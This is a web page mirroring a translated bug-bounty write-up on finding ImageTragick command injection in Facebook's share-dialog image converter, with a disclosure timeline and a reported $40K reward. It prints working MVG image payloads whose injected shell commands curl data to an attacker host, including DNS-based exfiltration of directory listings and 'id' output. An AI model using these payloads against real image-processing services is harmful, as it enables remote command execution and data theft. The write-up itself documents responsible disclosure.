<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Facebook's tragic images</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Hello! Yes, it was me 2 years 11 months and 6 days ago I promised to tell about new vulnerabilities. But over time, it became clear that, or they are ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Facebook's tragic images</h1><div class="post__text post__text-html js-mediator-article">  Hello!  Yes, it was me 2 years 11 months and 6 days ago I <a href="https://habrahabr.ru/post/212317/">promised to</a> tell about new vulnerabilities.  But over time, it became clear that, or they are not interesting, or they would have to tell about them using screenshots of more similar to the declassified documents of the special services - a couple of meaningless words and a bunch of black rectangles.  But - the time has come. <br><br>  I‚Äôm sure you‚Äôve heard all about <a href="https://www.imagemagick.org/">ImageMagick</a> and its <a href="https://imagetragick.com/">‚ÄúTragedy</a> . <a href="https://imagetragick.com/">‚Äù</a>  This vulnerability was found at the end of April 2016 and due to the fact that many image processing plugins used the ImageMagick library, this problem covered a large number of systems.  Since there was evidence that information about this vulnerability was available not only to the researchers who discovered it and to ImageMagick developers, but also to third parties, on May 3, 2016, information about the vulnerability (without PoC) was disclosed to the whole world.  Many researchers have taken advantage of this information and found vulnerabilities in applications that were not updated on time.  Unfortunately, I was not among the lucky ones.  But it was in May :) <br><a name="habracut"></a><br>  Once on Saturday, outside St. Petersburg was in October, I tested one great service - not Facebook.  But one of the redirects brought me to it - it was the ‚ÄúShare on Facebook‚Äù dialogue: <br><br><img src="https://habrastorage.org/files/265/555/16e/26555516e9dd474685945eeb3f38225f.png" alt="image">
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <pre><code class="hljs perl">https:<span class="hljs-regexp"><span class="hljs-regexp">//www</span></span>.facebook.com/dialog/feed?app_id=APP_ID&amp;<span class="hljs-keyword"><span class="hljs-keyword">link</span></span>=link.example.tld&amp;picture=http%3A%2F%2Fattacker.tld%2Fexploit.png&amp;name=news_name&amp;caption=news_caption&amp;description=news_descriotion&amp;redirect_uri=http%3A%2F%2Fwww.facebook.com&amp;ext=<span class="hljs-number"><span class="hljs-number">1476569763</span></span>&amp;hash=Aebid3vZFdh4UF1H</code> </pre> <br>  This dialogue could see many of you.  If we look closely, we can see that the <i>`picture`</i> parameter is a link to the image.  But there is no such image in the page content.  For example: <br><br><img src="https://habrastorage.org/files/846/c87/bc1/846c87bc1bd346a8b5106ae692e1378d.png" alt="https://www.google.com/images/errors/robot.png"><br><br><pre> <code class="hljs ruby"><span class="hljs-symbol"><span class="hljs-symbol">https:</span></span>/<span class="hljs-regexp"><span class="hljs-regexp">/www.google.com/images</span></span><span class="hljs-regexp"><span class="hljs-regexp">/errors/robot</span></span>.png</code> </pre> <br>  It turns into something like this: <br><br><img src="https://habrastorage.org/files/f91/10a/355/f9110a3554e84e1abab0e867b0773202.png" alt="https://external.fhen1-1.fna.fbcdn.net/safe_image.php?d=AQDaeWq2Fn1Ujs4P&amp;w=158&amp;h=158&amp;url=https%3A%2F%2Fwww.google.com%2Fimages%2Ferror%2Frobot.png&amp;ccc 1 &amp; _nc_hash = AQD2uvqIgAdXgWyb"><br><br><pre> <code class="hljs perl">https:<span class="hljs-regexp"><span class="hljs-regexp">//external</span></span>.fhen1-<span class="hljs-number"><span class="hljs-number">1</span></span>.fna.fbcdn.net/safe_image.php?d=AQDaeWq2Fn1Ujs4P&amp;w=<span class="hljs-number"><span class="hljs-number">158</span></span>&amp;h=<span class="hljs-number"><span class="hljs-number">158</span></span>&amp;url=https%3A%2F%2Fwww.google.com%2Fimages%2Ferrors%2Frobot.png&amp;cfs=<span class="hljs-number"><span class="hljs-number">1</span></span>&amp;upscale=<span class="hljs-number"><span class="hljs-number">1</span></span>&amp;_nc_hash=AQD2uvqIgAdXgWyb</code> </pre> <br>  The first thing I thought about was <a href="https://docs.google.com/document/d/1v1TkWZtrhzRLy0bYXBcdLUedXGb9njTNIJXa3u9akHM/edit">SSRF</a> vulnerability in one form or another.  But tests have shown that the url from this parameter is requested from the subgrid 31.13.97. * With the user agent <i>facebookexternalhit / 1.1</i> .  For example: <br><br><pre> <code class="bash hljs">$ nc -lvvv 8088 Connection from 31.13.97.* port 8088 [tcp/radan-http] accepted GET /exploit.png?ddfadsvdbv HTTP/1.1 User-Agent: facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php) Accept: */* Accept-Encoding: deflate, gzip Host: attacker.tld Connection: keep-alive</code> </pre> <br>  And all this looks like a normal request from an isolated subnet, which is specifically designed for this. <br><br>  But in any case, the application transforms the images with some kind of converter and I began to dig in this direction.  After several tests (one of my favorites that brought me a lot of money is parsing and converting SVG images, which are actually XML files to get <a href="https://docs.google.com/document/d/1v1TkWZtrhzRLy0bYXBcdLUedXGb9njTNIJXa3u9akHM/edit">SSRF</a> from the server that performs the conversion, and which is not always the same as the north from an image was requested or, if I was completely lucky, to get <a href="https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing">XXE</a> ) I was quite upset.  None of them worked. <br><br>  ImageTragick was the last hope.  Although I already had no hope.  If you are not very familiar with the details of the vulnerability and its exploitation or lazy - here you can find ready <a href="https://github.com/ImageTragick/PoCs">PoC</a> . <br><br>  This is what the easiest exploit.png <i>payload</i> looks like: <br><blockquote><pre> <code class="hljs vhdl">push graphic-<span class="hljs-keyword"><span class="hljs-keyword">context</span></span> viewbox <span class="hljs-number"><span class="hljs-number">0</span></span> <span class="hljs-number"><span class="hljs-number">0</span></span> <span class="hljs-number"><span class="hljs-number">640</span></span> <span class="hljs-number"><span class="hljs-number">480</span></span> image over <span class="hljs-number"><span class="hljs-number">0</span></span>,<span class="hljs-number"><span class="hljs-number">0</span></span> <span class="hljs-number"><span class="hljs-number">0</span></span>,<span class="hljs-number"><span class="hljs-number">0</span></span> <span class="hljs-symbol"><span class="hljs-symbol">'https</span></span>://<span class="hljs-number"><span class="hljs-number">127.0</span></span>.<span class="hljs-number"><span class="hljs-number">0.1</span></span>/x.php?x=%<span class="hljs-number"><span class="hljs-number">60</span></span>curl <span class="hljs-string"><span class="hljs-string">"http://attacker.tld/"</span></span> -d @- &gt; /dev/<span class="hljs-keyword"><span class="hljs-keyword">null</span></span>`' pop graphic-<span class="hljs-keyword"><span class="hljs-keyword">context</span></span></code> </pre> </blockquote><br>  Drum roll ... and nothing happened: <br><br><pre> <code class="bash hljs">$ nc -lvvv 80</code> </pre> <br>  Facepalm and Okay. <br><br>  ‚ÄúBut what if ... if these are just firewall restrictions?‚Äù  - I asked myself. <br><br>  OK.  This does happen quite often when a company blocks normal http requests, but does not block DNS requests.  Well, let's try another payload: <br><blockquote><pre> <code class="hljs vhdl">push graphic-<span class="hljs-keyword"><span class="hljs-keyword">context</span></span> viewbox <span class="hljs-number"><span class="hljs-number">0</span></span> <span class="hljs-number"><span class="hljs-number">0</span></span> <span class="hljs-number"><span class="hljs-number">640</span></span> <span class="hljs-number"><span class="hljs-number">480</span></span> image over <span class="hljs-number"><span class="hljs-number">0</span></span>,<span class="hljs-number"><span class="hljs-number">0</span></span> <span class="hljs-number"><span class="hljs-number">0</span></span>,<span class="hljs-number"><span class="hljs-number">0</span></span> <span class="hljs-symbol"><span class="hljs-symbol">'https</span></span>://<span class="hljs-number"><span class="hljs-number">127.0</span></span>.<span class="hljs-number"><span class="hljs-number">0.1</span></span>/x.php?x=%<span class="hljs-number"><span class="hljs-number">60</span></span>curl <span class="hljs-string"><span class="hljs-string">"http://record_under_attacker_controled_ns_server.attacker.tld/"</span></span> -d @- &gt; /dev/<span class="hljs-keyword"><span class="hljs-keyword">null</span></span>`' pop graphic-<span class="hljs-keyword"><span class="hljs-keyword">context</span></span></code> </pre> </blockquote><br>  It must be borne in mind that in this case, the attacker uses a DNS server that writes logs of requests to it.  And the result is: <br><blockquote>  IP: 31.13. *. *;  NetName: LLA1-11 <br>  NAME: record_under_attacker_controled_ns_server.attacker.tld, Type: A </blockquote><br>  Whois IP tells us: <br><blockquote><pre> <code class="hljs">netname: LLA1-11 descr: Facebook</code> </pre> </blockquote><br>  The party starts :) Thus the application works as follows: <br><br><ul><li>  Receives the <i>`picture`</i> parameter and requests it - this is a valid request and there are no vulnerabilities in it </li><li>  The resulting image is transferred to the converter that used the vulnerable version of the ImageMagick library. </li></ul><br>  To be honest, I tried to find the usual way to exploit this http request, but quick tests showed that either all outgoing ports are closed, or I would spend too much time to find at least one open one.  And I went the other way, which was enough to confirm the operation. <br><br>  Payload: <br><blockquote><pre> <code class="hljs vhdl">push graphic-<span class="hljs-keyword"><span class="hljs-keyword">context</span></span> viewbox <span class="hljs-number"><span class="hljs-number">0</span></span> <span class="hljs-number"><span class="hljs-number">0</span></span> <span class="hljs-number"><span class="hljs-number">640</span></span> <span class="hljs-number"><span class="hljs-number">480</span></span> image over <span class="hljs-number"><span class="hljs-number">0</span></span>,<span class="hljs-number"><span class="hljs-number">0</span></span> <span class="hljs-number"><span class="hljs-number">0</span></span>,<span class="hljs-number"><span class="hljs-number">0</span></span> <span class="hljs-symbol"><span class="hljs-symbol">'https</span></span>://<span class="hljs-number"><span class="hljs-number">127.0</span></span>.<span class="hljs-number"><span class="hljs-number">0.1</span></span>/x.php?x=%<span class="hljs-number"><span class="hljs-number">60</span></span><span class="hljs-keyword"><span class="hljs-keyword">for</span></span> i <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> $(ls /) ; do curl <span class="hljs-string"><span class="hljs-string">"http://$i.attacker.tld/"</span></span> -d @- &gt; /dev/<span class="hljs-keyword"><span class="hljs-keyword">null</span></span>; done`' pop graphic-<span class="hljs-keyword"><span class="hljs-keyword">context</span></span></code> </pre> </blockquote><br>  Result: <br><blockquote><pre> <code class="hljs pgsql"><span class="hljs-type"><span class="hljs-type">NAME</span></span>: home.attacker.tld, <span class="hljs-keyword"><span class="hljs-keyword">Type</span></span>: A <span class="hljs-type"><span class="hljs-type">NAME</span></span>: boot.attacker.tld, <span class="hljs-keyword"><span class="hljs-keyword">Type</span></span>: <span class="hljs-number"><span class="hljs-number">28</span></span> <span class="hljs-type"><span class="hljs-type">NAME</span></span>: dev.attacker.tld, <span class="hljs-keyword"><span class="hljs-keyword">Type</span></span>: <span class="hljs-number"><span class="hljs-number">28</span></span> <span class="hljs-type"><span class="hljs-type">NAME</span></span>: bin.attacker.tld, <span class="hljs-keyword"><span class="hljs-keyword">Type</span></span>: A ‚Ä¶ ‚Ä¶</code> </pre> </blockquote><br>  And so on‚Ä¶ <br><br>  The bash <i>`id` command</i> returned: <br><blockquote><pre> <code class="hljs pgsql"><span class="hljs-type"><span class="hljs-type">NAME</span></span>: uid=<span class="hljs-number"><span class="hljs-number">99</span></span>(nobody).attacker.tld., <span class="hljs-keyword"><span class="hljs-keyword">Type</span></span>: <span class="hljs-number"><span class="hljs-number">28</span></span> <span class="hljs-type"><span class="hljs-type">NAME</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">groups</span></span>=<span class="hljs-number"><span class="hljs-number">99</span></span>(nobody).attacker.tld., <span class="hljs-keyword"><span class="hljs-keyword">Type</span></span>: A <span class="hljs-type"><span class="hljs-type">NAME</span></span>: gid=<span class="hljs-number"><span class="hljs-number">99</span></span>(nobody).attacker.tld., <span class="hljs-keyword"><span class="hljs-keyword">Type</span></span>: A</code> </pre> </blockquote><br>  To confirm that the exploit is working, I sent the output of the command <i>`cat / proc / version` to the</i> Facebook security team, which I will not show here. <br><br>  In accordance with the <a href="https://www.facebook.com/whitehat/">Facebook Responsibility Policy,</a> I didn‚Äôt dig deeper. <br><br>  Already after I sent the report, Neal and I from the Facebook security team discussed the conclusion that <i>`cat / proc / version |</i>  <i>base64`</i> could be much more convenient for a DNS query, and a deeper study showed that base32 is commonly used in DNS tunneling techniques (read more here: <a href="https://www.sans.org/reading-room/whitepapers/dns/detecting-dns-tunneling-34152">https://www.sans.org/reading-room/whitepapers/dns/detecting- dns-tunneling-34152</a> ). <br><br>  I'm glad to be one of those who hacked Facebook. <br><br>  That's all:) <br><br>  Timeline: <br>  16 Oct 2016, 03:31 am: First Report <br>  Oct 18, 2016, 05:35 pm: Neil from the security team requested PoC, which I used during the research <br>  Oct 18, 2016, 8:40 pm: I sent the PoC and accompanied it with additional information <br>  Oct 18, 2016, 10:31 pm: Neil confirmed vulnerability <br>  19 Oct 2016, 12:26 am: Neil notified that fix in the process of calculations <br>  Oct 19, 2016 2:28 am: Neil reported that the vulnerability was fixed <br>  19 Oct 2016, 07:49 am: I confirmed that the vulnerability was fixed and requested the disclosure procedure <br>  22 Oct 2016, 03:34 am: Neil replied about the procedure and timing of disclosure <br>  Oct 28, 2016, 3:04 pm: Appointed reward ($ 40K) <br>  16 Dec 2016: Disclosure allowed. </div><p>Source: <a href="https://habr.com/ru/post/319676/">https://habr.com/ru/post/319676/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../319664/index.html">What to fix in the layout before release in production?</a></li>
<li><a href="../319666/index.html">About consumers and types of Threat Intelligence</a></li>
<li><a href="../319668/index.html">Architectural pain manifesto</a></li>
<li><a href="../319670/index.html">Console to the masses. Go to the bright side. Bash</a></li>
<li><a href="../319674/index.html">We form images from the text in PhantomJS</a></li>
<li><a href="../319678/index.html">Remote AJAX Components for ReactJS</a></li>
<li><a href="../319680/index.html">Scala.js is easy and simple</a></li>
<li><a href="../319682/index.html">Notify user with 99% probability</a></li>
<li><a href="../319684/index.html">Welcome to Moscow Python Meetup January 19</a></li>
<li><a href="../319686/index.html">Software developer must have sysadmin experience</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>